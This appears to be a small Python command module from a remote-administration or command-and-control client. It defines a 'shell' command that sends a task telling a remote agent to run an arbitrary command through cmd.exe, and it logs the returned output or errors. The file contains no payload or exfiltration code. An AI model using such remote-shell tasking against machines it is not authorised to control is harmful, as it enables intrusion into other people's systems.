from core.state import send_task
from core.state import TaskCode
from core import logging
from core.config import Paths

def finish_shell(response, cache):
    if not response.success:
        if response.return_code == 10:
            logging.error("Timeout reached. Terminating process.")

        # Other return codes maybe?
        
        else:
            logging.error("Failed to execute command")
        return False

    logging.print(response.return_data.decode())
        

def do_shell(self, command):
    """
    Execute a command with cmd.exe

    Syntax:
        shell <command>
    """

    send_task(TaskCode.Shell, argument1 = command)
